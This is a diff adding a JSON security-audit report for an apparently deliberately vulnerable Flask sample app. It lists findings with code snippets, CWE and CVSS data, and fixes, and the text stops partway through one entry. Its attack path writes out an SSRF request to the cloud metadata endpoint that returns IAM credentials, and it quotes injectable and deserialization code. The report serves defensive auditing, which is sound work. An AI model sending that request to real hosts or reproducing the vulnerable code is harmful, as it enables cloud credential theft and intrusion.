@@ -1,0 +1,2706 @@
+{
+  "attack_paths": [
+    {
+      "id": "AP-1",
+      "narrative": "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> is fetched server-side (app.py:35). Terraform allows IMDSv1 (infra/main.tf:25), so no session token is required and the role's temporary credentials are returned to the attacker. No authentication protects the route (MAN-001). Not validated at runtime; static chain only.",
+      "severity": "critical",
+      "steps": [
+        "AUTO-0011",
+        "AUTO-0037",
+        "MAN-001"
+      ],
+      "title": "Anonymous SSRF to AWS credential theft"
+    }
+  ],
+  "checklist_results": [
+    {
+      "checklist": "authorization.md",
+      "item": "AUTHZ-01",
+      "notes": "See MAN-001",
+      "result": "fail"
+    },
+    {
+      "checklist": "injection.md",
+      "item": "INJ-01",
+      "notes": "SQL injection confirmed",
+      "result": "fail"
+    },
+    {
+      "checklist": "ssrf-and-outbound.md",
+      "item": "SSRF-01",
+      "notes": "See AP-1",
+      "result": "fail"
+    },
+    {
+      "checklist": "business-logic-and-race-conditions.md",
+      "item": "BIZ-01",
+      "notes": "No stateful business workflows in the sample",
+      "result": "n/a"
+    },
+    {
+      "checklist": "mobile.md",
+      "item": "MOB-01",
+      "notes": "No mobile client",
+      "result": "n/a"
+    },
+    {
+      "checklist": "logging-monitoring-and-audit.md",
+      "item": "LOG-01",
+      "notes": "Logging config lives outside the repository",
+      "result": "untested"
+    }
+  ],
+  "coverage": [
+    {
+      "area": "authentication",
+      "check": "Authentication flows: login, reset, MFA, session lifecycle (checklists/authentication.md, session-jwt-oauth.md)",
+      "findings": 0,
+      "kind": "manual",
+      "reason": "requires analyst review (SKILL.md phases 3-7)",
+      "status": "skipped"
+    },
+    {
+      "area": "authorization",
+      "check": "Object/function-level authorization (BOLA/IDOR/BFLA) on every route - requires code tracing (checklists/authorization.md)",
+      "findings": 0,
+      "kind": "manual",
+      "reason": "requires analyst review (SKILL.md phases 3-7)",
+      "status": "skipped"
+    },
+    {
+      "area": "business-logic",
+      "check": "Business logic, race conditions and transaction integrity (checklists/business-logic-and-race-conditions.md)",
+      "findings": 0,
+      "kind": "manual",
+      "reason": "requires analyst review (SKILL.md phases 3-7)",
+      "status": "skipped"
+    },
+    {
+      "area": "cicd",
+      "check": "zizmor",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "data-flow",
+      "check": "Source-to-sink data-flow tracing across components",
+      "findings": 0,
+      "kind": "manual",
+      "reason": "requires analyst review (SKILL.md phases 3-7)",
+      "status": "skipped"
+    },
+    {
+      "area": "iac",
+      "check": "checkov",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "iac",
+      "check": "hadolint",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "inventory",
+      "check": "attack-surface-inventory",
+      "findings": 0,
+      "kind": "builtin",
+      "reason": "",
+      "status": "ran"
+    },
+    {
+      "area": "privacy",
+      "check": "Data classification, retention, backups and disaster recovery (checklists/privacy-and-data-protection.md)",
+      "findings": 0,
+      "kind": "manual",
+      "reason": "requires analyst review (SKILL.md phases 3-7)",
+      "status": "skipped"
+    },
+    {
+      "area": "rules",
+      "check": "pack:auth",
+      "findings": 3,
+      "kind": "builtin",
+      "reason": "10 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:cicd",
+      "findings": 4,
+      "kind": "builtin",
+      "reason": "8 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:config",
+      "findings": 6,
+      "kind": "builtin",
+      "reason": "14 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:crypto",
+      "findings": 2,
+      "kind": "builtin",
+      "reason": "9 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:deserialization",
+      "findings": 2,
+      "kind": "builtin",
+      "reason": "9 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:iac",
+      "findings": 16,
+      "kind": "builtin",
+      "reason": "23 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:injection",
+      "findings": 10,
+      "kind": "builtin",
+      "reason": "28 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:secrets",
+      "findings": 3,
+      "kind": "builtin",
+      "reason": "13 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:supply-chain",
+      "findings": 9,
+      "kind": "builtin",
+      "reason": "13 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "rules",
+      "check": "pack:xss",
+      "findings": 2,
+      "kind": "builtin",
+      "reason": "13 rules, 0 unreadable files",
+      "status": "ran"
+    },
+    {
+      "area": "runtime",
+      "check": "Runtime behaviour, deployed configuration and infrastructure state (needs authorized DAST/cloud review)",
+      "findings": 0,
+      "kind": "manual",
+      "reason": "requires analyst review (SKILL.md phases 3-7)",
+      "status": "skipped"
+    },
+    {
+      "area": "sast",
+      "check": "bandit",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sast",
+      "check": "brakeman",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sast",
+      "check": "gosec",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sast",
+      "check": "semgrep",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sca",
+      "check": "known-vulnerability-lookup",
+      "findings": 0,
+      "kind": "builtin",
+      "reason": "no SCA source ran - dependency CVEs were NOT checked. Install osv-scanner/trivy or use --osv-api.",
+      "status": "unavailable"
+    },
+    {
+      "area": "sca",
+      "check": "osv-api",
+      "findings": 0,
+      "kind": "builtin",
+      "reason": "opt-in: pass --osv-api (sends package names/versions to api.osv.dev)",
+      "status": "skipped"
+    },
+    {
+      "area": "sca",
+      "check": "govulncheck",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sca",
+      "check": "npm-audit",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sca",
+      "check": "osv-scanner",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sca",
+      "check": "pip-audit",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "sca+iac",
+      "check": "trivy",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "secrets",
+      "check": "git-tracked-sensitive-files",
+      "findings": 0,
+      "kind": "builtin",
+      "reason": "not a git repository",
+      "status": "not-applicable"
+    },
+    {
+      "area": "secrets",
+      "check": "gitleaks",
+      "findings": 0,
+      "kind": "tool",
+      "reason": "--no-tools given",
+      "status": "skipped"
+    },
+    {
+      "area": "supply-chain",
+      "check": "installed-npm-install-hooks",
+      "findings": 0,
+      "kind": "builtin",
+      "reason": "runs in deep mode only (mode=comprehensive)",
+      "status": "skipped"
+    },
+    {
+      "area": "supply-chain",
+      "check": "lockfiles+typosquat-heuristic",
+      "findings": 3,
+      "kind": "builtin",
+      "reason": "",
+      "status": "ran"
+    },
+    {
+      "area": "threat-model",
+      "check": "Threat model and attack-path chaining (references/threat-modeling.md)",
+      "findings": 0,
+      "kind": "manual",
+      "reason": "requires analyst review (SKILL.md phases 3-7)",
+      "status": "skipped"
+    }
+  ],
+  "executive_summary": "This sample application is not fit for deployment. Unauthenticated users can execute code on the server (unsafe deserialization, command injection), read the database (SQL injection), and pivot from an SSRF flaw to cloud credentials because the instance allows IMDSv1. The CI workflow lets anyone who opens a pull request run code with repository secrets. Fix the five immediate items first, rotate every credential found in the repository, then address the infrastructure exposure.",
+  "findings": [
+    {
+      "category": "cicd",
+      "confidence": "high",
+      "cvss_score": 10.0,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
+      "cwe": [
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Matched 2 required signal(s).",
+      "fingerprint": "d5028719e93c5c1e763d",
+      "id": "AUTO-0001",
+      "impact": "",
+      "location": {
+        "end_line": 3,
+        "path": ".github/workflows/ci.yml",
+        "snippet": "pull_request_target:",
+        "start_line": 3
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Do not check out or run PR head code in pull_request_target; use pull_request, or split into an unprivileged build + privileged workflow_run.",
+      "rule_id": "CI-GHA-PRT-UNTRUSTED-CHECKOUT",
+      "severity": "critical",
+      "sources": [
+        "builtin:cicd"
+      ],
+      "status": "unverified",
+      "title": "pull_request_target checks out untrusted PR code",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "deserialization",
+      "confidence": "high",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cwe": [
+        "CWE-502"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for DES-PY-PICKLE.",
+      "fingerprint": "0a0d3c3601a492ea2c26",
+      "id": "AUTO-0012",
+      "impact": "",
+      "location": {
+        "end_line": 45,
+        "path": "app.py",
+        "snippet": "return str(pickle.loads(request.data))",
+        "start_line": 45
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Never unpickle untrusted data; use JSON or a schema-validated format. Sign data with HMAC if pickle is unavoidable.",
+      "rule_id": "DES-PY-PICKLE",
+      "severity": "critical",
+      "sources": [
+        "builtin:deserialization"
+      ],
+      "status": "confirmed",
+      "title": "Unsafe Python deserialization (pickle and friends)",
+      "triage_reason": "request.data passed straight to pickle.loads on an unauthenticated POST route: pre-auth RCE by construction.",
+      "validation_steps": []
+    },
+    {
+      "category": "secrets",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-798"
+      ],
+      "description": "",
+      "evidence": "Value Pr0d\u2026[redacted 11 chars] (entropy 3.46). Secret redacted; it was not used or validated.",
+      "fingerprint": "121427fe1d187a3f23dd",
+      "id": "AUTO-0002",
+      "impact": "",
+      "location": {
+        "end_line": 1,
+        "path": ".env",
+        "snippet": "DATABASE_URL=postgres://admin:Pr0d\u2026[redacted 11 chars]@db.internal:5432/app",
+        "start_line": 1
+      },
+      "owasp": [
+        "A07:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Move the connection string to a secret store / environment variable and rotate the database password.",
+      "rule_id": "SEC-CONN-STRING-CREDS",
+      "severity": "high",
+      "sources": [
+        "builtin:secrets"
+      ],
+      "status": "unverified",
+      "title": "Credentials embedded in connection URL",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "secrets",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-798"
+      ],
+      "description": "",
+      "evidence": "Value ghp_\u2026[redacted 40 chars] (entropy 5.07). Secret redacted; it was not used or validated.",
+      "fingerprint": "6995595c6a88f0193860",
+      "id": "AUTO-0003",
+      "impact": "",
+      "location": {
+        "end_line": 2,
+        "path": ".env",
+        "snippet": "GITHUB_TOKEN=ghp_\u2026[redacted 40 chars]",
+        "start_line": 2
+      },
+      "owasp": [
+        "A07:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Revoke the token in GitHub settings, review the audit log, and use GITHUB_TOKEN or a secrets store.",
+      "rule_id": "SEC-GITHUB-TOKEN",
+      "severity": "high",
+      "sources": [
+        "builtin:secrets"
+      ],
+      "status": "unverified",
+      "title": "GitHub token in source",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cicd",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-78",
+        "CWE-94"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for CI-GHA-SCRIPT-INJECTION.",
+      "fingerprint": "1b61f6dce44e7377219b",
+      "id": "AUTO-0004",
+      "impact": "",
+      "location": {
+        "end_line": 13,
+        "path": ".github/workflows/ci.yml",
+        "snippet": "- run: echo \"Issue: ${{ github.event.issue.title }}\"",
+        "start_line": 13
+      },
+      "owasp": [
+        "A03:2021",
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Pass the value through an env var (env: TITLE: ${{ github.event.issue.title }}) and reference \"$TITLE\" in the script.",
+      "rule_id": "CI-GHA-SCRIPT-INJECTION",
+      "severity": "high",
+      "sources": [
+        "builtin:cicd"
+      ],
+      "status": "unverified",
+      "title": "Untrusted GitHub context expanded in workflow script",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "secrets",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-798",
+        "CWE-538"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-DOCKER-SECRET-IN-LAYER.",
+      "fingerprint": "32e845d01dbad46e0681",
+      "id": "AUTO-0005",
+      "impact": "",
+      "location": {
+        "end_line": 3,
+        "path": "Dockerfile",
+        "snippet": "ENV DB_PASSWORD=supe\u2026[redacted 14 chars]",
+        "start_line": 3
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use BuildKit secrets (RUN --mount=type=secret) and inject runtime secrets via the orchestrator.",
+      "rule_id": "IAC-DOCKER-SECRET-IN-LAYER",
+      "severity": "high",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Secret passed via ENV/ARG in image",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "secrets",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-798"
+      ],
+      "description": "",
+      "evidence": "Value s3cr\u2026[redacted 28 chars] (entropy 3.84). Secret redacted; it was not used or validated.",
+      "fingerprint": "f2f6c485b41dcbd67dd8",
+      "id": "AUTO-0006",
+      "impact": "",
+      "location": {
+        "end_line": 11,
+        "path": "app.py",
+        "snippet": "app.config[\"SECRET_KEY\"] = \"s3cr\u2026[redacted 28 chars]\"",
+        "start_line": 11
+      },
+      "owasp": [
+        "A07:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Load SECRET_KEY / session secrets from the environment or secrets manager; rotate the exposed value (this invalidates sessions/signatures).",
+      "rule_id": "CFG-HARDCODED-APP-SECRET",
+      "severity": "high",
+      "sources": [
+        "builtin:config"
+      ],
+      "status": "unverified",
+      "title": "Hardcoded framework secret key",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "secrets",
+      "confidence": "high",
+      "cvss_score": 9.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "cwe": [
+        "CWE-798"
+      ],
+      "description": "Hardcoded cloud credentials can be harvested from source, history, packages and build artifacts.",
+      "evidence": "Value AKIA\u2026[redacted 20 chars] (entropy 4.12). Secret redacted; it was not used or validated.",
+      "fingerprint": "af55fd400e92f8109063",
+      "id": "AUTO-0007",
+      "impact": "",
+      "location": {
+        "end_line": 12,
+        "path": "app.py",
+        "snippet": "AWS_ACCESS_KEY_ID = \"AKIA\u2026[redacted 20 chars]\"",
+        "start_line": 12
+      },
+      "owasp": [
+        "A07:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Remove the key, rotate it in IAM immediately, audit CloudTrail for its use, and load credentials from the environment, an instance/workload role, or a secrets manager.",
+      "rule_id": "SEC-AWS-ACCESS-KEY",
+      "severity": "high",
+      "sources": [
+        "builtin:secrets"
+      ],
+      "status": "unverified",
+      "title": "AWS access key ID in source",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "authorization",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-306",
+        "CWE-862"
+      ],
+      "description": "All ten Flask routes and all Express routes are reachable without a session or token; there is no auth middleware, decorator or gateway configuration in the repository.",
+      "evidence": "app.py defines @app.route handlers with no login_required/before_request hook; server.js mounts handlers directly on `app` with no auth middleware; no gateway/ingress auth config present.",
+      "fingerprint": "372a9b414328e581007c",
+      "id": "MAN-001",
+      "impact": "Every other weakness is reachable by anonymous internet users, raising each to its pre-auth severity.",
+      "location": {
+        "end_line": 60,
+        "path": "app.py",
+        "snippet": "",
+        "start_line": 16
+      },
+      "owasp": [
+        "A01:2021",
+        "A07:2021",
+        "API2:2023"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "def test_all_routes_require_auth(client):\n    for rule in app.url_map.iter_rules():\n        if rule.endpoint == 'static':\n            continue\n        assert client.get(rule.rule).status_code in (401, 403)",
+      "remediation": "Introduce a default-deny authentication layer (before_request hook / Express middleware mounted before routes), then per-route authorization checks; add a test that enumerates routes and asserts 401 without credentials.",
+      "rule_id": "MANUAL-MAN-001",
+      "severity": "high",
+      "sources": [
+        "manual-review"
+      ],
+      "status": "missing-control",
+      "title": "No authentication or authorization on any HTTP route",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "injection",
+      "confidence": "high",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cwe": [
+        "CWE-89"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-PY-SQL-STRING.",
+      "fingerprint": "d1857e575972946766e7",
+      "id": "AUTO-0008",
+      "impact": "",
+      "location": {
+        "end_line": 19,
+        "path": "app.py",
+        "snippet": "return str(conn.execute(f\"SELECT * FROM users WHERE id = {uid}\").fetchall())",
+        "start_line": 19
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use parameterized queries (cursor.execute(sql, params)) or ORM query builders; never interpolate untrusted values into SQL.",
+      "rule_id": "INJ-PY-SQL-STRING",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "confirmed",
+      "title": "SQL built with string formatting (Python)",
+      "triage_reason": "Traced: request.args['id'] (app.py:17) -> f-string -> conn.execute (app.py:19); no validation or parameterization on the path.",
+      "validation_steps": []
+    },
+    {
+      "category": "injection",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-78"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-PY-SHELL-TRUE.",
+      "fingerprint": "2ae19806b7574fc79f64",
+      "id": "AUTO-0009",
+      "impact": "",
+      "location": {
+        "end_line": 25,
+        "path": "app.py",
+        "snippet": "return subprocess.check_output(\"ping -c 1 \" + host, shell=True)",
+        "start_line": 25
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Pass an argument list with shell=False; if a shell is unavoidable, use shlex.quote on every untrusted value.",
+      "rule_id": "INJ-PY-SHELL-TRUE",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "subprocess with shell=True",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "injection",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-1336"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-PY-SSTI.",
+      "fingerprint": "aa65b78956c88ca2c4de",
+      "id": "AUTO-0010",
+      "impact": "",
+      "location": {
+        "end_line": 30,
+        "path": "app.py",
+        "snippet": "return render_template_string(\"<h1>Hello \" + request.args.get(\"name\", \"\") + \"</h1>\")",
+        "start_line": 30
+      },
+      "owasp": [
+        "A03:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Render fixed template files and pass user data as context variables; never build template source from input.",
+      "rule_id": "INJ-PY-SSTI",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "Template rendered from a dynamic string (SSTI)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "ssrf",
+      "confidence": "high",
+      "cvss_score": 8.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+      "cwe": [
+        "CWE-918"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-SSRF-PY.",
+      "fingerprint": "189b0ca7d311a170dc35",
+      "id": "AUTO-0011",
+      "impact": "",
+      "location": {
+        "end_line": 35,
+        "path": "app.py",
+        "snippet": "return requests.get(request.args[\"url\"], timeout=5).text",
+        "start_line": 35
+      },
+      "owasp": [
+        "A10:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Validate the URL against an allowlist of hosts/schemes, resolve and block private/link-local ranges (incl. 169.254.169.254), disable redirects or re-validate them.",
+      "rule_id": "INJ-SSRF-PY",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "confirmed",
+      "title": "Outbound request to user-controlled URL (Python)",
+      "triage_reason": "request.args['url'] reaches requests.get with no scheme/host allowlist; see AP-1.",
+      "validation_steps": []
+    },
+    {
+      "category": "deserialization",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-502"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for DES-PY-YAML-UNSAFE.",
+      "fingerprint": "a396d29b649836a2d8ee",
+      "id": "AUTO-0013",
+      "impact": "",
+      "location": {
+        "end_line": 50,
+        "path": "app.py",
+        "snippet": "return str(yaml.load(request.data))",
+        "start_line": 50
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use yaml.safe_load or Loader=yaml.SafeLoader.",
+      "rule_id": "DES-PY-YAML-UNSAFE",
+      "severity": "high",
+      "sources": [
+        "builtin:deserialization"
+      ],
+      "status": "unverified",
+      "title": "Unsafe YAML load (Python)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "path-traversal",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-22"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for INJ-PATH-TRAVERSAL-PY.",
+      "fingerprint": "13736063f0635789576b",
+      "id": "AUTO-0014",
+      "impact": "",
+      "location": {
+        "end_line": 55,
+        "path": "app.py",
+        "snippet": "return open(os.path.join(\"files\", request.args[\"name\"])).read()",
+        "start_line": 55
+      },
+      "owasp": [
+        "A01:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use werkzeug.utils.safe_join / send_from_directory, or resolve and verify the path stays under the base directory.",
+      "rule_id": "INJ-PATH-TRAVERSAL-PY",
+      "severity": "high",
+      "sources": [
+        "builtin:injection"
+      ],
+      "status": "unverified",
+      "title": "Request data used in filesystem path (Python)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "crypto",
+      "confidence": "high",
+      "cvss_score": 6.8,
+      "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "cwe": [
+        "CWE-295"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for CRY-TLS-VERIFY-DISABLED.",
+      "fingerprint": "9d265703cc0a5d6140dd",
+      "id": "AUTO-0015",
+      "impact": "",
+      "location": {
+        "end_line": 59,
+        "path": "app.py",
+        "snippet": "requests.get(\"https://internal.example\", verify=False)",
+        "start_line": 59
+      },
+      "owasp": [
+        "A02:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Keep certificate and hostname verification on; trust a private CA bundle explicitly if needed.",
+      "rule_id": "CRY-TLS-VERIFY-DISABLED",
+      "severity": "high",
+      "sources": [
+        "builtin:crypto"
+      ],
+      "status": "unverified",
+      "title": "TLS certificate verification disabled",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "misconfiguration",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-489",
+        "CWE-94"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for CFG-FLASK-DEBUG.",
+      "fingerprint": "312b6676e76664ef8f91",
+      "id": "AUTO-0016",
+      "impact": "",
+      "location": {
+        "end_line": 60,
+        "path": "app.py",
+        "snippet": "app.run(host=\"0.0.0.0\", debug=True)",
+        "start_line": 60
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Never enable debug outside local development; the Werkzeug console allows code execution.",
+      "rule_id": "CFG-FLASK-DEBUG",
+      "severity": "high",
+      "sources": [
+        "builtin:config"
+      ],
+      "status": "unverified",
+      "title": "Flask/Werkzeug debugger enabled",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cloud",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-284"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-TF-PUBLIC-BUCKET.",
+      "fingerprint": "a24a4c01cb3c95462cb0",
+      "id": "AUTO-0017",
+      "impact": "",
+      "location": {
+        "end_line": 14,
+        "path": "infra/main.tf",
+        "snippet": "block_public_acls   = false",
+        "start_line": 14
+      },
+      "owasp": [
+        "A01:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Enable S3 Block Public Access (all four settings), remove public ACLs, and serve public content via CloudFront with OAC.",
+      "rule_id": "IAC-TF-PUBLIC-BUCKET",
+      "severity": "high",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Object storage publicly accessible",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cloud",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-284"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-TF-PUBLIC-BUCKET.",
+      "fingerprint": "8f1516e0b8c25fb30ee6",
+      "id": "AUTO-0018",
+      "impact": "",
+      "location": {
+        "end_line": 15,
+        "path": "infra/main.tf",
+        "snippet": "block_public_policy = false",
+        "start_line": 15
+      },
+      "owasp": [
+        "A01:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Enable S3 Block Public Access (all four settings), remove public ACLs, and serve public content via CloudFront with OAC.",
+      "rule_id": "IAC-TF-PUBLIC-BUCKET",
+      "severity": "high",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Object storage publicly accessible",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "cloud",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-284"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-DB-PUBLICLY-ACCESSIBLE.",
+      "fingerprint": "c4054fcf9fbf64b050dc",
+      "id": "AUTO-0019",
+      "impact": "",
+      "location": {
+        "end_line": 19,
+        "path": "infra/main.tf",
+        "snippet": "publicly_accessible = true",
+        "start_line": 19
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Set publicly_accessible = false and place databases in private subnets.",
+      "rule_id": "IAC-DB-PUBLICLY-ACCESSIBLE",
+      "severity": "high",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Database publicly accessible",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "secrets",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-798"
+      ],
+      "description": "",
+      "evidence": "Value hunt\u2026[redacted 14 chars] (entropy 2.81). Secret redacted; it was not used or validated.",
+      "fingerprint": "b67050428fabbc644950",
+      "id": "AUTO-0020",
+      "impact": "",
+      "location": {
+        "end_line": 21,
+        "path": "infra/main.tf",
+        "snippet": "password            = \"hunt\u2026[redacted 14 chars]\"",
+        "start_line": 21
+      },
+      "owasp": [
+        "A07:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Use a secrets manager reference or a generated random_password; mark variables sensitive.",
+      "rule_id": "IAC-HARDCODED-PASSWORD",
+      "severity": "high",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "unverified",
+      "title": "Hardcoded password in infrastructure code",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "kubernetes",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-250"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for IAC-K8S-HOST-NAMESPACE.",
+      "fingerprint": "5cadf6a6c7cde4f41b5f",
+      "id": "AUTO-0021",
+      "impact": "",
